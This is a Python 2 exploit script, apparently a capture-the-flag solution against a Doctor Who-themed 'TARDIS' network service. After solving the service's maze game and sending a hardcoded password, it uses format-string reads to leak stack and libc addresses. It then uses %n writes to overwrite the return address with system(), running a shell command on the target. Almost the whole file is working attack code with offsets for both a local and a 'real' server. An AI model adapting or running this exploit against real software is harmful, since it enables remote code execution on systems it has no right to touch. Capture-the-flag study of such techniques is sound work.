#!/usr/bin/env python

import sys
import time
import struct
import re

# Run with, eg:
# ncat -o log -v 127.0.0.1 2606 --sh-exec ./sploit.py

#from pwnlib import *
#from pwnlib.elf import *

def hexify(s):
    return " ".join("{:02x}".format(ord(c)) for c in s)

class Playfield(object):
    def __init__(self):
        self.is_tardis = False
        self.angels = []
        self.doctor = None
        self.exit = None

def read_playfield():
    sys.stdin.readline()
    pf = Playfield()
    for y in range(20):
        line = sys.stdin.readline()[3:-1]
        for x, c in enumerate(line):
            if c == "A":
                pf.angels.append((x, y))
            elif c in "<>V^":
                pf.doctor = (x, y)
            elif c == "E":
                pf.exit = (x, y)
            elif c == "T":
                pf.exit = (x, y)
                pf.is_tardis = True
            elif c == " ":
                pass
            else:
                assert False, c
    return pf

def solve(pf):
    dx, dy = pf.doctor
    ex, ey = pf.exit
    mx, my = (ex - dx, ey - dy)
    moves = []
    if abs(mx) > abs(my):
        if mx > 0:
            moves.append(("d", (1, 0)))
        else:
            moves.append(("a", (-1, 0)))
        if my > 0:
            moves.append(("s", (0, 1)))
        else:
            moves.append(("w", (0, -1)))
        if mx > 0:
            moves.append(("a", (-1, 0)))
        else:
            moves.append(("d", (1, 0)))
    else:
        if my > 0:
            moves.append(("s", (0, 1)))
        else:
            moves.append(("w", (0, -1)))
        if mx > 0:
            moves.append(("d", (1, 0)))
        else:
            moves.append(("a", (-1, 0)))
        if my > 0:
            moves.append(("w", (0, -1)))
        else:
            moves.append(("s", (0, 1)))
    for key, delta in moves:
        nx, ny = (dx + delta[0], dy + delta[1])
        if (nx, ny) not in pf.angels:
            if (nx, ny) == pf.exit:
                return key, True
            sys.stdin.read(len("Your move (w,a,s,d,q): "))
            return key, False
    else:
        assert False, "no moves :("

d = None

def leak(address):
    print >> sys.stderr, "*** Leak 0x%04x" % address
    s = "51.492137,-0.192878 " + struct.pack("<I", address) + " >>>%20$s<<<"
    s = "    51.492137,-0.192878 >>>%24$s<<< " + struct.pack("<IIII", address, address, address, address)
    #print >> sys.stderr, "s", repr(s)
    print s
    sys.stdout.flush()
    sys.stdin.readline() # Echoed coordinates.
    resp = sys.stdin.readline()
    #print >> sys.stderr, "resp", repr(resp)
    m = re.search(r'>>>(.*)<<<', resp, flags=re.DOTALL)
    while m is None:
        extra = sys.stdin.readline()
        assert extra, repr(extra)
        resp += extra
        print >> sys.stderr, "read again", repr(resp)
        m = re.search(r'>>>(.*)<<<', resp, flags=re.DOTALL)
    assert m is not None, repr(resp)
    resp = m.group(1)
    if resp == "":
        resp = "\0"
    return resp

sys.stdin.readline()
sys.stdin.readline()
sys.stdin.readline()

while True:
    pf = read_playfield()
    key, done = solve(pf)
    print >> sys.stderr, key
    print key
    sys.stdout.flush()
    if done:
        if pf.is_tardis:
            break
        else:
            sys.stdin.readline()

time.sleep(0.1)

print "UeSlhCAGEp" # Hardcoded password
sys.stdout.flush()

sys.stdin.readline() # TARDIS KEY: Welcome to the TARDIS!
sys.stdin.readline() # Your options are:
sys.stdin.readline() # 1. Turn on the console
sys.stdin.readline() # 2. Leave the TARDIS

# Overwrite the socket with \0
sys.stdout.write("01234567\0")
sys.stdout.flush()

sys.stdin.readline() # Selection: Invalid
sys.stdin.readline() # Your options are:
sys.stdin.readline() # 1. Turn on the console
sys.stdin.readline() # 2. Leave the TARDIS

time.sleep(2) # Has to be at least 2

# Send a fake timestamp that's within the correct range
sys.stdout.write("\x6d\x2b\x59\x55")
sys.stdout.flush()

# This overwrites the socket again - if we don't do this, it eats 4 bytes later on
sys.stdout.write("012345678\n")
sys.stdout.flush()

time.sleep(0.1)

sys.stdin.readline()
sys.stdin.readline()
sys.stdin.readline()
sys.stdin.readline()
sys.stdin.readline()
sys.stdin.readline()
sys.stdin.readline()
sys.stdin.readline()

print "1"
sys.stdout.flush()

sys.stdin.readline() # Selection: The TARDIS console is online!Your options are:
sys.stdin.readline() # 1. Turn on the console
sys.stdin.readline() # 2. Leave the TARDIS
sys.stdin.readline() # 3. Dematerialize

print "3"
sys.stdout.flush()

time.sleep(0.1)

# Leak the two important values - the frame pointer (saved ebp) and the return address
print "51.492137, -0.192878 %274$p %275$p"
sys.stdout.flush()

print >> sys.stderr, repr(sys.stdin.readline()) # Echoed coordinates

result = sys.stdin.readline().split()
ebp  = int(result[3], 16)
return_addr = int(result[4], 16)

# The address that do_jump returns to
print >> sys.stderr, "return address:", hex(return_addr)
print >> sys.stderr, "should be:      0x56556491"
print >> sys.stderr, ""

# The value of ebp that's pushed to the stack and read later by our memory leak
print >> sys.stderr, "saved ebp:", hex(ebp)
print >> sys.stderr, "should be: 0xffffca8c"
print >> sys.stderr, ""

# The base address of the image
image_base = return_addr - 0x1491
print >> sys.stderr, "image_base:", hex(image_base)
print >> sys.stderr, "should be:  0x56555000"
print >> sys.stderr, ""

# The address of the print() libc call
printf_ptr = image_base + 0x5014
print >> sys.stderr, "printf_ptr:", hex(printf_ptr)
print >> sys.stderr, "should be:  0x5655a014"
print >> sys.stderr, ""

# The address of the write() libc call
write_ptr = image_base + 0x5068
print >> sys.stderr, "write_ptr:", hex(write_ptr)
print >> sys.stderr, "should be:  0x????????"
print >> sys.stderr, ""

# The address, in memory, of our buffer
buffer_addr = ebp - 0x520
print >> sys.stderr, "buffer_addr:", hex(buffer_addr)
print >> sys.stderr, "should be:   0xffffc56c"
print >> sys.stderr, ""

# The address, in memory, of our return address
return_ptr = ebp - 0x10c
print >> sys.stderr, "return_ptr:", hex(return_ptr)
print >> sys.stderr, "should be: 0xffffc97c"
print >> sys.stderr, ""

print >> sys.stderr, "--"

# Get the libc address of write()
write_addr_str = leak(write_ptr)
print >> sys.stderr, "returned from leak(): ", ' '.join(x.encode('hex') for x in write_addr_str)
print >> sys.stderr, ""

write_addr, = struct.unpack_from("<I", write_addr_str)
print >> sys.stderr, "write_addr:", hex(write_addr)
print >> sys.stderr, "should be:   0xf7e5d0b0"
print >> sys.stderr, ""

# Get the libc address of printf()
printf_addr_str = leak(printf_ptr)
print >> sys.stderr, "returned from leak(): ", ' '.join(x.encode('hex') for x in printf_addr_str)
print >> sys.stderr, ""

printf_addr, = struct.unpack_from("<I", printf_addr_str)
print >> sys.stderr, "printf_addr:", hex(printf_addr)
print >> sys.stderr, "should be:   0xf7e5d0b0"
print >> sys.stderr, ""

# This is only valid on the real server
libc_base_REAL = printf_addr - 0x4d280
libc_base_MINE = printf_addr - 0x4e0b0
print >> sys.stderr, "libc_base (mine):", hex(libc_base_MINE)
print >> sys.stderr, "libc_base (real):", hex(libc_base_REAL)
print >> sys.stderr, "should be: 0xf7e0f000"
print >> sys.stderr, ""


# REAL
# printf_addr = 0xf778e014
# system_addr = 0xf75ef190
system_addr_REAL = libc_base_REAL + 0x40190

# MINE
# printf_addr = 
# system_addr = 0xf7ebb450
system_addr_MINE = libc_base_MINE + 0x3f3d0

# Used this code to bruteforce the base address of libc
#bf = printf_addr - 0xc280
#while True:
#    print >> sys.stderr, "Checking", hex(bf), " (printf - ", hex(printf_addr - bf), ")..."
#    str = leak(bf)
#    print >> sys.stderr, hexify(str)
#    if(str[0:4] == "\x7FELF"):
#        break
#
#    bf -= 0x1000

# Used this code to get the offset to system()
#d = dynelf.DynELF(leak, libc_base_REAL, elf=ELF("./their_libc"))
#system_addr = d.lookup("system", 'libc')

print >> sys.stderr, "system addr (real):", hex(system_addr_REAL)
print >> sys.stderr, "system addr (mine):", hex(system_addr_MINE)
print >> sys.stderr, "should be:   0xf7e4e3d0"
print >> sys.stderr, ""

# Write a single byte to a single address, using a format string attack
def write_byte(addr, value):
    s = "51.492137,-0.192878 " + struct.pack("<I", addr)
    s += "%" + str(value + 256 - 24) + "x%20$n\n"
    print >> sys.stderr, "Writing to ", hex(addr)
    print >> sys.stderr, s

    print s
    sys.stdout.flush()

    sys.stdin.readline()
    print >> sys.stderr, "Done!"

system_addr = system_addr_MINE
write_byte(return_ptr+0, (system_addr >> 0) & 0x0FF)
write_byte(return_ptr+1, (system_addr >> 8) & 0x0FF)
write_byte(return_ptr+2, (system_addr >> 16) & 0x0FF)
write_byte(return_ptr+3, (system_addr >> 24) & 0x0FF)

write_byte(return_ptr+4, 0x5e)
write_byte(return_ptr+5, 0x5e)
write_byte(return_ptr+6, 0x5e)
write_byte(return_ptr+7, 0x5e)

command_addr = buffer_addr + 200 + 4
write_byte(return_ptr+8,  (command_addr >> 0) & 0x0FF)
write_byte(return_ptr+9,  (command_addr >> 8) & 0x0FF)
write_byte(return_ptr+10, (command_addr >> 16) & 0x0FF)
write_byte(return_ptr+11, (command_addr >> 24) & 0x0FF)

str = "100000,100000 "
while(len(str) < 200):
    str += " "
str += "ls -l /home\n"
print str
sys.stdout.flush()

while(1):
    line = sys.stdin.readline()
    if(not(line)):
        print >>sys.stderr, "Connection closed!"
        sys.exit(0)
    print >> sys.stderr, line
